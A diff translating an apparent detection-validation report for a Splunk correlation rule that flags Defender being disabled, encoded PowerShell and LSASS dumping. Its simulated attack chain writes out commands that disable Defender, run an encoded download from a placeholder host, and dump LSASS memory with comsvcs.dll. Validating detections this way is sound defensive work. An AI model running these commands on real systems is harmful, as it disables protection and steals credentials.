@@ -1,25 +1,30 @@
-# 🧪 Validation Report: Correlation Rule - Credential Theft & Evasion
+# Validation Report: Correlation Rule - Credential Theft & Evasion
 
-## 📋 Informazioni Generali
+## General Information
+
 * **Correlation Name:** Multi-Stage Attack: Credential Theft & Evasion
-* **Regola di Riferimento:** `12-Correlation-Credential-Theft.md`
-* **Severity:** 🔴 CRITICAL
-* **Obiettivo:** Validare il rilevamento dell'esfiltrazione della memoria LSASS successiva alla disattivazione dell'antivirus tramite PowerShell.
+* **Reference Rule:** `12-Correlation-Credential-Theft.md`
+* **Severity:** CRITICAL
+* **Objective:** Validate the detection of LSASS memory extraction following the disabling of antivirus protection through PowerShell.
 
-## 🎯 The Attack Chain (Kill Chain Simulata)
-I seguenti comandi sono stati eseguiti (entro 24 ore) sulla postazione bersaglio.
+## The Attack Chain (Simulated Kill Chain)
 
-**Fase 1: Defense Evasion (Disattivazione Defender)**
+The following commands were executed on the target workstation (within 24 hours).
+
+**Phase 1: Defense Evasion (Disabling Defender)**
+
 ```powershell
 Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 
-**Fase 2: Execution (Esecuzione Payload Offuscato)**
+**Phase 2: Execution (Execution of an Obfuscated Payload)**
+
 ```powershell
 powershell.exe -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwBiAGEAZAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAiAA==
 ```
 
-**Fase 3: Credential Access (LSASS Memory Dump)**
+**Phase 3: Credential Access (LSASS Memory Dump)**
+
 ```powershell
 rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\Temp\lsass.dmp full
 ```
@@ -28,14 +33,15 @@ rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\Temp\lsass.dmp ful
 
 ---
 
-## 📡 Telemetria Attesa
+## Expected Telemetry
 
-1. `EventCode 4688` / `EventCode 1` con stringa `Set-MpPreference`
-2. `EventCode 4688` / `EventCode 1` con flag `-enc`
-3. `EventCode 10` (Sysmon Process Access) verso `lsass.exe`
+1. `EventCode 4688` / `EventCode 1` with the string `Set-MpPreference`
+2. `EventCode 4688` / `EventCode 1` with the `-enc` flag
+3. `EventCode 10` (Sysmon Process Access) targeting `lsass.exe`
 
-## 🔴 Correlated Splunk Query (SPL)
-```SPL
+## Correlated Splunk Query (SPL)
+
+```SPL id="z6r1p4"
 (index=wineventlog OR index=sysmon) 
 ( 
   (EventCode=1 OR EventCode=4688) ("* -enc *" OR "* -encodedcommand *") 
@@ -46,13 +52,14 @@ rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\Temp\lsass.dmp ful
 )
 | transaction host maxspan=24h
 | search "lsass.exe" AND ("-enc" OR "-encodedcommand") AND ("DisableRealtimeMonitoring" OR "Set-MpPreference")
-| eval Attack_Chain="ALLARME CRITICO: Esecuzione Powershell Encoded -> Disattivazione Defender -> Accesso e Dumping di LSASS"
+| eval Attack_Chain="CRITICAL ALERT: Encoded PowerShell Execution -> Defender Disabled -> LSASS Access and Dumping"
 | table _time, host, duration, Attack_Chain
 ```
 
-## ✅ Risultato della Validazione e Screenshot
-La correlazione ha raggruppato perfettamente la timeline d'attacco isolando l'host compromesso.
+## Validation Result and Screenshot
 
-**Risultato:** `PASS` 🟢
+The correlation successfully grouped the attack timeline and isolated the compromised host.
+
+**Result:** `PASS`
 
 <img width="1200" height="487" alt="Screenshot 2026-06-14 171520" src="https://github.com/user-attachments/assets/8b567b8f-6e89-4ff6-a667-9cd6432af59e" />
